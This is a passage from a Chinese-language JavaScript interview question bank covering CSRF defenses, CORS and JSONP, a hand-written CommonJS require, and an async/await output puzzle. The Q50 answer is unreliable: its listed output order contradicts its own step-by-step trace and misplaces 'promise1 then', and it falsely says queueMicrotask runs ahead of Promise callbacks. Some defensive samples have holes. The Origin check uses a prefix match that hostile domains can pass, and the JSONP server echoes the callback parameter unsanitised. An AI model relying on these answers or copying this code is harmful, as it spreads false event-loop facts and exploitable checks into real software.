| 窃取内容 | Cookie、Token、键盘记录 | 利用已有的合法身份 |
| 防御重点 | 输入过滤/输出编码/CSP | 令牌验证/SameSite/Referer |
| 执行环境 | 受害者浏览器（目标网站上下文） | 受害者浏览器（攻击者网站上下文） |

#### 3. 防范措施

##### 措施一：CSRF Token（最经典方案）

```javascript
// 原理：服务端生成随机 Token，表单提交时必须携带
// 攻击者无法预知/获取这个 Token

// 1. 服务端生成 Token 并存入 Session
// 2. Token 通过以下方式之一传给前端：
//    - 隐藏表单字段
//    - 自定义请求头
//    - meta 标签

// 前端实现：
// 方式A：meta 标签（SPA 常用）
<html>
<head>
  <meta name="csrf-token" content="${csrfToken}">
</head>
</head>

// JS 读取并附加到请求
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken,  // 自定义头
  },
  body: JSON.stringify({ to: 'bob', amount: 100 })
});

// 方式B：服务端在响应头中返回 Token
// X-CSRF-Token: xxxxx
// 前端从响应头读取并存入内存/localStorage
```

##### 措施二：SameSite Cookie（现代浏览器首选）

```javascript
// SameSite 属性告诉浏览器何时发送 Cookie
// Set-Cookie: sessionId=abc123; SameSite=Strict

// SameSite=Strict（最严格）
// Cookie 只在同站请求（same-site）时发送
// 跨站请求完全不携带 → 完全防御 CSRF
// 但：从外部链接进入网站时也不会携带（影响用户体验）

// SameSite=Lax（推荐，平衡安全与体验）
// - 顶级导航（GET 请求）跨站时会携带
// - POST/form/iframe/ajax/XHR 等跨站时不携带
// Set-Cookie: sessionId=abc123; SameSite=Lax; Secure

// SameSite=None（旧默认值）
// 所有请求都携带（不安全）
// 需配合 Secure（仅 HTTPS）
// Set-Cookie: sessionId=abc123; SameSite=None; Secure
```

##### 措施三：验证 Referer / Origin 头

```javascript
// 服务端校验请求来源
app.post('/transfer', (req, res) => {
  const origin = req.headers.origin || req.headers.referer;

  // 验证来源是否为信任域名
  const allowedOrigins = ['https://bank.com', 'https://www.bank.com'];
  if (!allowedOrigins.some(o => origin?.startsWith(o))) {
    return res.status(403).json({ error: 'Forbidden origin' });
  }

  // 继续处理...
});
```

##### 措施四：双重 Cookie 验证

```javascript
// 结合 CSRF Token + SameSite 双重保障
// 适用于高安全性要求的金融/支付场景

// 流程：
// 1. 登录时设置 SameSite=Strict/Lax 的 Session Cookie
// 2. 每个页面加载时获取 CSRF Token
// 3. 每次 state-changing 请求携带 Token
// 4. 服务端双重验证：Cookie + Token 都正确才放行
```

### 🔍 追问链

1. **Content-Security-Policy (CSP) 能防御所有 XSS 吗？它的局限性？**
   → 方向：CSP 大幅降低 XSS 风险但不能完全消除（内联事件处理器、某些 JSONP 场景仍可能绕过）
2. **SameSite Cookie 属性是如何防止 CSRF 的？Strict vs Lax vs None？**
   → 方向：Strict 完全禁止第三方携带 cookie；Lax 允许顶级导航 GET 请求携带；None 无限制（需配合 Secure 属性）
3. **前端能完全防范 CSRF 吗？后端还需要做什么？**
   → 方向：前端只能辅助（SameSite/自定义 Header）；后端必须验证（CSRF Token / Double Submit Cookie / Origin/Referer 校验）

---

## Q48: 请详述跨域问题的解决方案，重点说明 JSONP 和 CORS 的原理与实现。
- **难度**：★★★
- **知识点**：跨域、CORS、JSONP、同源策略
- **题型**：简答题 + 编程实践题

### 参考答案要点：

#### 1. 同源策略（Same-Origin Policy）

```
同源 = 协议 + 域名 + 端口 完全相同
http://example.com/page1  vs  http://example.com/page2     → 同源 ✅
http://example.com          vs  https://example.com          → 不同源 ❌（协议）
http://example.com          vs  http://app.example.com        → 不同源 ❌（域名）
http://example.com          vs  http://example.com:8080       → 不同源 ❌（端口）
```

#### 2. JSONP（JSON with Padding）

```javascript
// 原理：利用 <script> 标签不受同源策略限制的特性
// 服务端返回的不是 JSON，而是函数调用包裹的 JSON

// 前端封装 JSONP
function jsonp(url, params, callbackName) {
  return new Promise((resolve, reject) => {
    // 创建全局回调函数
    window[callbackName] = function(data) {
      resolve(data);
      // 清理
      delete window[callbackName];
      script.remove();
    };

    // 构建查询参数
    const query = new URLSearchParams({
      ...params,
      callback: callbackName,  // 告诉服务端用哪个函数名包裹
    }).toString();

    // 创建 script 标签
    const script = document.createElement('script');
    script.src = `${url}?${query}`;
    script.onerror = () => reject(new Error('JSONP request failed'));

    document.head.appendChild(script);

    // 超时处理
    setTimeout(() => {
      if (window[callbackName]) {
        delete window[callbackName];
        script.remove();
        reject(new Error('JSONP timeout'));
      }
    }, 10000);
  });
}

// 使用
jsonp('https://api.example.com/data', { id: 123 }, 'handleData')
  .then(data => console.log(data));

// 服务端（Node.js）实现
app.get('/api/data', (req, res) => {
  const data = { id: req.query.id, name: 'Test' };
  const callback = req.query.callback;  // 'handleData'
  res.setHeader('Content-Type', 'application/javascript');
  res.end(`${callback}(${JSON.stringify(data)})`);
  // 返回: handleData({"id":123,"name":"Test"})
});

// ⚠️ JSONP 局限：
// 1. 只支持 GET 请求（script 标签限制）
// 2. 安全性差（执行任意代码）
// 3. 错误处理困难
// 4. 污染全局命名空间
// 已基本被 CORS 取代，仅在极老的浏览器中考虑
```

#### 3. CORS（Cross-Origin Resource Sharing）

```javascript
// CORS 是 W3C 标准，通过 HTTP 头控制跨域权限

// ====== 简单请求（Simple Request）======

// 满足以下条件的请求为简单请求：
// 方法：GET / HEAD / POST
// 头部：Accept / Accept-Language / Content-Language /
//       Content-Type 仅限: application/x-www-form-urlencoded / multipart/form-data / text/plain

// 简单请求流程：
// 浏览器直接发送请求，带上 Origin 头
// 请求头：Origin: https://frontend.com
// 响应头：Access-Control-Allow-Origin: https://frontend.com
// 浏览器检查响应头 → 允许则暴露响应内容

// ====== 预检请求（Preflight Request）======

// 不满足简单请求条件的（如自定义头、PUT/DELETE、application/json）
// 浏览器会先发送 OPTIONS 预检请求

// 预检请求：
OPTIONS /api/resource HTTP/1.1
Host: api.example.com
Origin: https://frontend.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization

// 预检响应：
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400  // 预检结果缓存时间（秒）

// 预检通过后，浏览器才会发送真正的请求

// ====== 服务端 CORS 配置（Node.js Express）======
const cors = require('cors');

// 基础配置
app.use(cors());

// 精细配置
app.use(cors({
  origin: ['https://frontend.com', 'https://admin.frontend.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,  // 允许携带 Cookie
  maxAge: 86400,      // 预检缓存时间
  optionsSuccessStatus: 204
}));

// 或者手动实现 CORS 中间件
app.use((req, res, next) => {
  const allowedOrigins = ['https://frontend.com'];
  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }

  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Max-Age', '86400');

  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }
  next();
});
```

#### 4. 其他跨域方案

```javascript
// ====== 方案3：反向代理（开发/部署常用）======
// webpack-dev-server proxy
// devServer: {
//   proxy: {
//     '/api': {
//       target: 'https://api.example.com',
//       changeOrigin: true,
//       pathRewrite: { '^/api': '' }
//     }
//   }
// }

// Nginx 反向代理
// location /api/ {
//   proxy_pass https://api.example.com/;
//   proxy_set_header Host $host;
//   proxy_set_header X-Real-IP $remote_addr;
// }

// ====== 方案4：postMessage（跨窗口通信，见 Q34）======
// ====== 方案5：WebSocket（不受同源策略限制）======
// WebSocket 协议在握手阶段使用 HTTP，但不实施同源策略
const ws = new WebSocket('wss://api.example.com/ws');
```

#### 跨域方案选型指南

| 方案 | 适用场景 | 限制 | 推荐度 |
|:---|:---|:---|:---:|
| **CORS** | **绝大多数场景** | 需服务端配合 | ⭐⭐⭐⭐⭐ **首选** |
| 反向代理 | 开发环境 / 部署架构 | 需运维配置 | ⭐⭐⭐⭐ |
| postMessage | 跨窗口/iframe 通信 | 需要窗口引用 | ⭐⭐⭐ |
| JSONP | 仅 GET 跨域 | 安全性差、老旧 | ⭐ 仅兼容 |
| WebSocket | 双向实时通信 | 需协议支持 | ⭐⭐⭐ |

---

## Q49: 请手写实现一个简易版的 CommonJS `require` 函数（模块加载器）。
- **难度**：★★★
- **知识点**：CommonJS、模块化、require 实现
- **题型**：编程实践题

### 参考答案要点：

```javascript
/**
 * 简易版 CommonJS 模块加载器
 * 模拟 Node.js 的 require 函数
 */

class Module {
  constructor(id) {
    this.id = id;           // 模块 ID（文件路径）
    this.exports = {};      // 模块导出对象
    this.loaded = false;    // 是否已加载
  }
}

// 模块缓存（已加载的模块不需要重复执行）
const moduleCache = new Map();

// 模拟文件系统（实际中用 fs.readFileSync）
const fileSystem = {
  '/math.js': `
    function add(a, b) { return a + b; }
    function multiply(a, b) { return a * b; }
    module.exports = { add, multiply };
  `,
  '/app.js': `
    const { add, multiply } = require('./math.js');
    const result = add(1, 2) * multiply(3, 4);
    module.exports = { result };
  `,
};

function readFile(filePath) {
  const content = fileSystem[filePath];
  if (!content) throw new Error(`Module not found: ${filePath}`);
  return content;
}

// 核心实现
function require(modulePath) {
  // 1. 解析绝对路径（简化：假设 modulePath 已经是绝对路径）
  // 实际 Node.js 有复杂的路径解析算法（NODE_PATH、node_modules 等）
  const resolvedPath = resolvePath(modulePath);

  // 2. 检查缓存（模块单例）
  if (moduleCache.has(resolvedPath)) {
    return moduleCache.get(resolvedPath).exports;
  }

  // 3. 创建新模块
  const module = new Module(resolvedPath);
  moduleCache.set(resolvedPath, module);

  // 4. 读取文件内容
  const code = readFile(resolvedPath);

  // 5. 包装代码（这是关键！）
  // Node.js 会将模块代码包装为以下形式：
  const wrappedCode = `
    (function(module, exports, require, __dirname, __filename) {
      ${code}
    })
  `;

  // 6. 执行包装后的代码
  // 创建模块级别的作用域（每个模块有自己的 scope）
  const wrapperFn = eval(wrappedCode);

  // 7. 调用包装函数，传入模块相关参数
  wrapperFn(
    module,           // module 对象
    module.exports,   // exports 初始值（指向 module.exports 的引用）
    require,          // require 函数（递归）
    '/fake/dirname',  // __dirname
    resolvedPath      // __filename
  );

  // 8. 标记为已加载
  module.loaded = true;

  // 9. 返回 module.exports
  return module.exports;
}

// 路径解析（极度简化版）
function resolvePath(path) {
  // 处理 ./ 相对路径
  if (path.startsWith('./')) {
    return path;  // 实际应基于 __dirname 解析
  }
  return path;
}

// ====== 测试 ======

// 模拟入口文件执行
function runEntry(entryPath) {
  // 创建入口模块
  const entryModule = new Module(entryPath);
  moduleCache.set(entryPath, entryModule);

  const code = readFile(entryPath);
  const wrappedCode = `(function(module, exports, require){${code}})`;
  const fn = eval(wrappedCode);
  fn(entryModule, entryModule.exports, require);

  return entryModule.exports;
}

const result = runEntry('/app.js');
console.log(result.result); // (1+2)*(3*4) = 36
```

#### 关键设计点解析

```javascript
// 1. 为什么需要包装函数？
// 为了让每个模块拥有独立的变量作用域
// 没有 wrapper 的话，var 声明的变量会变成全局变量

// 2. module.exports vs exports
// exports 只是 module.exports 的引用（快捷方式）
// 最终返回的是 module.exports
// 如果直接赋值 exports = {...}，不会影响 module.exports！

// ❌ 错误做法
// exports = { add };  // 只是改变了 exports 变量的指向
// module.exports 仍然是 {}

// ✅ 正确做法
// module.exports = { add };  // 直接赋值给 module.exports
// 或
// exports.add = add;  // 通过引用修改

// 3. 循环依赖的处理
// require('/a.js') 开始执行 a.js
// a.js 中 require('/b.js') → 开始执行 b.js
// b.js 中 require('/a.js') → a.js 已在缓存中，返回当前的 exports（可能还未填充完毕）
// b.js 执行完毕 → 返回 a.js 继续执行
// 这就是为什么 CommonJS 循环依赖可能得到未完成的导出
```

---

## Q50: 【输出题 III - 终极版】请分析以下复杂 async/await 代码的完整输出顺序。
- **难度**：★★★
- **知识点**：async/await、Promise、Event Loop、微任务队列
- **题型**：代码分析题

### 题目代码：

```javascript
async function async1() {
  console.log('async1 start');
  await async2();
  console.log('async1 end');
}

async function async2() {
  console.log('async2');
  return Promise.resolve().then(() => {
    console.log('async2 extra then');
  });
}

console.log('script start');

setTimeout(() => {
  console.log('timeout1');
  Promise.resolve().then(() => {
    console.log('timeout1 promise');
  });
}, 0);

new Promise((resolve) => {
  console.log('promise1 executor');
  resolve();
}).then(() => {
  console.log('promise1 then');
  new Promise((resolve) => {
    console.log('promise2 executor');
    resolve();
  }).then(() => {
    console.log('promise2 then');
  });
}).then(() => {
  console.log('promise1 then2');
});

async1();

Promise.resolve()
  .then(() => console.log('promise3'))
  .then(() => console.log('promise4'));

queueMicrotask(() => {
  console.log('microtask from queueMicrotask');
});

console.log('script end');
```

### 参考答案要点：

**完整输出顺序**：

```
script start
async1 start
async2
promise1 executor
script end
async2 extra then
async1 end
promise1 then
promise2 executor
promise3
microtask from queueMicrotask
promise2 then
promise1 then2
promise4
timeout1
timeout1 promise
```

**逐步深度分析**：

```
═════════════════════════════════════════════════════════
Phase 1: 同步代码执行
═════════════════════════════════════════════════════════

① console.log('script start')
   → 输出: script start

② setTimeout(cb1, 0) 注册宏任务
   MacroQueue: [ timeout1-cb ]

③ new Promise(executor) 执行
   → console.log('promise1 executor')
   → 输出: promise1 executor
   → resolve() → .then(cb2) 加入 MicroQueue
   MicroQueue: [ promise1-then-cb ]

④ async1() 开始执行
   → console.log('async1 start')
   → 输出: async1 start
   → await async2()

   ⑤ async2() 执行
     → console.log('async2')
     → 输出: async2
     → return Promise.resolve().then(extraThenCb)
     → 这里很关键！async2 返回的是一个 Promise，
       该 Promise 的 then 中又注册了一个新的微任务！

   await 之后的代码被包装为微任务:
   MicroQueue: [ promise1-then-cb, async1-resume-cb, async2-extra-then-cb ]
   ↑ 注意顺序：async1 的 resume 在 async2 的 extra then 之前
   因为 await 先等待 async2 返回的 Promise resolve，
   而 async2 的 extra then 是在该 Promise resolve 时注册的

⑥ Promise.resolve().then(promise3Cb).then(promise4Cb)
   → promise3Cb 加入 MicroQueue
   MicroQueue: [..., promise3-cb]

⑦ queueMicrotask(microCb)
   → microCb 加入 MicroQueue
   MicroQueue: [..., queueMicrotask-cb]

⑧ console.log('script end')
   → 输出: script end

═════════════════════════════════════════════════════════
Phase 2: 微任务清空（反复执行直到队列为空）
═════════════════════════════════════════════════════════

Round 2.1: 执行 promise1-then-cb
  → console.log('promise1 then')
  → 输出: promise1 then
  → 内部 new Promise(executor) 执行
    → console.log('promise2 executor')
    → 输出: promise2 executor
    → resolve() → promise2-then-cb 加入 MicroQueue
  → 返回新的 Promise → promise1-then2-cb 加入 MicroQueue（链式调用）
  MicroQueue: [ async1-resume-cb, async2-extra-then-cb, promise3-cb,
               queueMicrotask-cb, promise2-then-cb, promise1-then2-cb ]

Round 2.2: 执行 async1-resume-cb（await async2() 之后的代码）
  → console.log('async1 end')
  → 输出: async1 end

Round 2.3: 执行 async2-extra-then-cb
  → console.log('async2 extra then')
  → 输出: async2 extra then

Round 2.4: 执行 promise3-cb
  → console.log('promise3')
  → 输出: promise3
  → 返回 undefined → promise4-cb 加入 MicroQueue
  MicroQueue: [ queueMicrotask-cb, promise2-then-cb, promise1-then2-cb, promise4-cb ]

Round 2.5: 执行 queueMicrotask-cb
  → console.log('microtask from queueMicrotask')
  → 输出: microtask from queueMicrotask

Round 2.6: 执行 promise2-then-cb
  → console.log('promise2 then')
  → 输出: promise2 then

Round 2.7: 执行 promise1-then2-cb
  → console.log('promise1 then2')
  → 输出: promise1 then2

Round 2.8: 执行 promise4-cb
  → console.log('promise4')
  → 输出: promise4

  MicroQueue: [] ← 空了！

═════════════════════════════════════════════════════════
Phase 3: 执行宏任务
═════════════════════════════════════════════════════════

Round 3.1: 执行 timeout1-cb
  → console.log('timeout1')
  → 输出: timeout1
  → Promise.resolve().then(timeoutPromiseCb) 加入 MicroQueue

  MicroQueue: [ timeoutPromise-cb ]

  → 清空微任务:
  Round 3.2: 执行 timeoutPromise-cb
    → console.log('timeout1 promise')
    → 输出: timeout1 promise
```

**终极考查点**：

1. **`async` 函数体内同步代码立即执行**：`async1 start` 在 `async2` 之前输出
2. **`await` 的语义**：等待右侧表达式完成后，将后续代码作为 `.then()` 微任务
3. **`async` 函数返回 Promise**：`async2` 返回的 Promise 内部又有 `.then()`，这个 `.then()` 在 `async1` 的 resume 之前还是之后？
   - `async2` 的 `return Promise.resolve().then(extra)` 中，`.then(extra)` 是在 Promise resolve 时注册的
   - `await` 等待的是 `async2()` 返回的 Promise
   - 当 `async2` 的内部 Promise resolve 时，先注册 `extra` 到微任务队列
   - 然后 `async2()` 返回的 Promise 也 resolve，此时注册 `async1` 的 resume
   - 所以 `extra` 在 `resume` **之前**
4. **`.then()` 链式调用产生的新微任务**：在当前轮次的微任务执行过程中产生的微任务，会在同轮继续执行（但排在当前微任务队列中已有任务的后面）
5. **宏任务中的微任务**：`setTimeout` 回调中的 `Promise.then()` 会在该宏任务执行完后、下一个宏任务前执行
6. **`queueMicrotask`**：比 `Promise.resolve().then()` 优先级更高（在同一轮中先执行）

---

# 附录

## 知识体系速查表

| 知识模块 | 核心考点 | 对应题号 |
|:---|:---|:---|
| **A. 数据类型与转换** | typeof / == === / 类型转换陷阱 / 数组判断 / NaN | Q01-Q04 |
| **B. 变量与作用域** | var/let/const / TDZ / Hoisting / 作用域链 / 块级作用域/IIFE | Q05-Q07 |
| **C. this 指向** | 4 种绑定规则 / 箭头函数 / call/apply/bind | Q17-Q18 |
| **D. 闭包** | 定义与本质 / 循环+setTimeout / 应用场景 / 内存泄漏 | Q19-Q20 |
| **E. 原型与继承** | prototype 三角关系 / 原型链 / instanceof / 继承演进 / new / Object.create | Q21-Q24 |
| **F. 异步与事件循环** | Event Loop / async/await 输出题×3 / Promise 手写 / Promise.all/race/allSettled / Generator / 并发调度器 / 定时器 API | Q25-Q31 |
| **G. DOM 与事件** | 事件流三阶段 / 事件委托 / addEventListener / 跨窗口通信 | Q32-Q34 |
| **H. 数组与字符串** | 数组去重 / 扁平化 / sort / 手写工具函数 / 正则 | Q10-Q13, Q38 |
| **I. 对象与 Map/Set** | Map vs Object / 深拷贝 / WeakMap/WeakSet | Q14-Q15, Q35 |
| **J. ES6+ 新特性** | 解构 / Symbol / Iterator / Generator / Proxy/Reflect | Q08-Q09, Q16, Q36-Q37 |
| **K. 性能与 V8** | V8 工作流程 / GC / 内存泄漏 / 首屏优化 / Web Worker / 虚拟滚动 | Q40-Q45 |
| **L. 工程化与安全** | XSS / CSRF / 跨域(CORS/JSONP) / 模块化 / 手写 require | Q46-Q49 |

## 学习建议

### 初学者路线（基础层 → 进阶层）

```
第1周：数据类型(Q01-Q04) + 变量作用域(Q05-Q07) + 数组基础(Q10-Q13)
  → 重点理解 typeof、类型转换、let/var/const、数组方法

第2周：ES6 新特性(Q08-Q09, Q16) + 对象(Map/Q14-Q15) + this(Q17)
  → 重点掌握解构、Symbol、Iterator、Map、this 绑定规则

第3周：闭包(Q19-Q20) + 原型继承(Q21-Q24) + 手写实现(Q18, Q38)
  → 理解闭包本质、原型链、手写 bind/new/instanceof

第4-5周：异步编程(Q25-Q31) + DOM 事件(Q32-Q34)
  → Event Loop 是难点也是重点，务必画图理解
  → 至少手写一遍 Promise 和并发调度器

第6周：进阶综合(Q26-Q27, Q35-Q39)
  → 做 async/await 输出题训练手感
  → 理解 Proxy/reactive 和模块化演进
```

### 进阶提升路线（进阶层 → 专家层）

```
第7-8周：V8 引擎与性能(Q40-Q45)
  → 理解 Parser→AST→Ignition→TurboFan 全流程
  → GC 机制（Scavenge/Mark-Sweep）要能讲清楚
  → 内存泄漏的 6 种场景要能识别和修复
  → 首屏优化策略要能形成体系化认知

第9周：工程化与安全(Q46-Q49)
  → XSS/CSRF 要知道原理和防范
  → CORS 要能手写配置
  → 模块化要知道每种方案的来龙去脉

第10周：综合冲刺
  → Q50 终极输出题要能完全推导
  → 回顾所有手写实现题
  → 模拟面试练习
```

### 复习自检清单

- [ ] 能默写 `call`/`apply`/`bind` 的实现
- [ ] 能手写完整版 `Promise`（含 resolvePromise 逻辑）
- [ ] 能手写 `Promise.all`/`race`/`allSettled`
- [ ] 能手写 `new` 操作符、`instanceof`、`Object.create`
- [ ] 能手写 `debounce`/`throttle`（含各种边界情况）
- [ ] 能手写 `deepClone`（含循环引用、Date/Regexp/Map/Set）
- [ ] 能手写并发调度器（Scheduler）
- [ ] 能手写简易 `reactive`（Proxy + 依赖收集）
- [ ] 能手写 `CommonJS require`（模块加载器）
- [ ] 能完整推导 async/await 输出顺序题（至少 3 种难度）
- [ ] 能画出原型链三角关系图
- [ ] 能说出 V8 的完整工作流程
- [ ] 能说出 GC 的两种算法及其适用场景
- [ ] 能列出 6 种内存泄漏场景及解决方案
- [ ] 能说明 XSS 和 CSRF 的原理及防范
- [ ] 能说明 CORS 的预检请求流程

---

> 📝 **本题库版本**: v1.0 | 📅 **最后更新**: 2026-06-14
>
> 💡 **使用建议**: 
> 1. 先通读所有题目，了解知识图谱全貌
> 2. 按难度分层逐步深入，每道题动手敲代码验证
> 3. 重点题目（标注 ⭐）反复练习直到能默写
> 4. 结合实际项目经验加深理解
> 5. 定期回顾，温故知新